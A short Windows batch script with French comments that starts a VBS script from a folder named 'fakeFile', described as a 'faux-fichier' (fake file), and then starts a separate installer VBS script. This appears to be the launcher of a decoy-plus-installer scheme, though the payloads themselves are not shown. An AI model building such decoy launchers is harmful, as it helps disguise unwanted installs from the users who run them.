@echo off

:: Revenir vers le dossier files
cd ../

:: Lancement du faux-fichier
cd fakeFile/
start launcher.vbs

:: Revenir vers le dossier files
cd ../

:: Lancement de l'installeur
cd installer/
start installer.vbs

exit